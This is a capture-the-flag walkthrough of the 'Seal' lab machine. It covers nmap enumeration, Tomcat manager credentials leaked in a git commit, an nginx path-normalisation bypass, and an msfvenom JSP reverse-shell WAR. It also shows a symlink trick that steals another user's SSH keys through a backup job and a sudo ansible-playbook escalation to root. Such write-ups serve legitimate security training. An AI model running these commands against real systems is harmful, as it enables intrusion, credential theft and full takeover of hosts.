# 💫 Enumration

##### Nmap Scan
```text
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy
```

##### 🔎 Detailed Scan 
	
```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-05T10:24:03
| Not valid after:  2022-05-05T10:24:03
| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
|_SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Thu, 23 Sep 2021 08:35:27 GMT
|     Set-Cookie: JSESSIONID=node0fbf1ky049b9h1ff7lepk8ym9d2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Thu, 23 Sep 2021 08:35:26 GMT
|     Set-Cookie: JSESSIONID=node0culo6dwhtuhf1jtr8luu7u7gq0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 23 Sep 2021 08:35:27 GMT
|     Set-Cookie: JSESSIONID=node01ap9wi1u0ec8us862vkbi4ixi1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

***
#### 🔱 Enumrating port 8080

On Reading the Repositery , we came to know there is a **`Load Balancing Setup`** using :
- Apache Tomcat/9.0.31 (Ubuntu) [As Main Server]
- nginx/1.18.0 (Ubuntu) [As Proxy]

On Further reading configuration files we came to know the path for `Apache Tomcat` manager & Username-Password for Authentication 
\
Username & Password were found from `commit` to repositery in `tomcat-users.xml` file

- **tomcat : 42MrHBf*z8{Z%**

---

### 💚 Accessing Manager page

Since we are getting **`403`** Access Denid we are going to bypass this restriction

- **https://seal.htb/manager;foo/html;bare/**  ⭐
\
We can bypass the rule on `Ngix` for `/manager/html` and forward the request to `Tomcat` which is going to intercept the request for above as
✨ https://seal.htb/manager/html  
\
Because `Tomcat` is going to ingore words after **`;`**

##### Resources :

- ✔️ [A fresh look on reverse proxy related attacks | Acunetix](https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/)

- ✔️ [Breaking Parser Logic - Take Your Path Normalization Off and Pop 0days Out (blackhat.com)](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

---
# ❗ Foothold

Now Since we got into `Tomcat` Manger we can create `.war` reverse shell and get a shell 

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=9001 -f war -o revshell.war
```

---
# 😐 User
We got the shell as `tomcat` 😺

There is fine named `run.yml` which contains the vector for Getting the user
```shell
tomcat@seal:/opt/backups$ cat playbook/run.yml
cat playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```
      
Here we can see This is copying `symlinks` as well from the directories 
\
On looking up at a particular Directory we can notice that backup is running evey minute

```shell
 tomcat@seal:/opt/backups/playbook$ ls -l /opt/backups/archives/
ls -l /opt/backups/archives/
total 1776
-rw-rw-r-- 1 luis luis 606047 Sep xx 06:35 backup-2021-09-27-06:35:32.gz
-rw-rw-r-- 1 luis luis 606047 Sep xx 06:36 backup-2021-09-27-06:36:32.gz
-rw-rw-r-- 1 luis luis 606047 Sep xx 06:37 backup-2021-09-27-06:37:32.gz
```
\
🌀 `run.yml` is copying the content of `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` with it's `symlink`

- So we can link `.ssh` Directory of `Luis` user to get it's ssh key 
```bash
ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```

> Choosed `uploads` folder because `tomcat` user have `rwx` permissions

Once the Backup is down we can extract the key from it and use to ssh as `luis`

---

# 💥Privilage Escalation
On doing `sudo -l`
We can see `luis` user is allowed to run `ansible-playbook` as sudo with no password
\
So we can Create our own file as run it as sudo
```bash
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF
```
**💖 Source :** [ansible playbook | GTFOBins](https://gtfobins.github.io/gtfobins/ansible-playbook/)



